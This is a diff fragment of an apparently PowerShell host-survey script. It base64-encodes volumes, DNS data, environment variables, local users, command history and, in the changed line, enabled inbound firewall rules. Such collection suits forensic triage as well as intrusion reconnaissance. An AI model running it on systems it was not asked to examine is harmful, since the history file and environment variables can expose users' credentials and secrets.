@@ -29,7 +29,7 @@ disk_volumes = Encode64(Get-Volume | out-string);
 dns = Encode64(Get-DnsClientServerAddress | out-string);
 dns_cache = Encode64(Get-DnsClientCache | out-string);
 env = Encode64(Get-ChildItem Env: | out-string);
-firewall_status = Encode64(Get-NetFirewallRule -Enabled True | out-string);
+firewall_status = Encode64(netsh advfirewall firewall show rule dir=in name=all | Select-String -Pattern 'Yes' -Exclude "Edge traversal" -AllMatches -Context 2,11 | out-string);
 get_local_user = Encode64(Get-LocalUser | ft Name,Enabled,Description,LastLogon | out-string);
 history_ps = Encode64(Get-History | out-string);
 history_bis = Encode64(Get-Content (Get-PSReadlineOption).HistorySavePath | out-string); 
